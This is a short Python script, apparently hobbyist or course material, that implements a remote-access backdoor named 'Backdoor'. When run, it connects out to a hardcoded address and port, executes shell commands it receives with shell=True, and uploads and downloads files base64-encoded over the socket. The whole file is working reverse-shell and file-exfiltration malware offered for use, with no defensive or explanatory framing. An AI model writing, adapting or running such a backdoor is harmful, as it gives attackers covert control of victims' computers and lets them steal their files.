#!/usr/bin/env python
import socket,json,os,base64,os,sys
import  subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Connection Established\n")

    def execute_system_commands(self, command):
        return subprocess.Popen(command, shell=True)

    def send_reliable(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_reliable(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except:
                continue

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] changing working directory to "+ path
    def read_file(self,path):
        with open(path,"rb") as file:
            file_encode_base64 = base64.b64encode(file.read())
            return file_encode_base64

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Upload successful"
    def run(self):
        while True:
            command = self.receive_reliable()
            print(command)
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command)>1:
                    self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_commands(command)
            except Exception:
                print("[-] Error during command execution.")
                command_result = "[-] Error during command execution."
            self.send_reliable(command_result)
backdoor = Backdoor("192.168.184.156",4470)
backdoor.run()
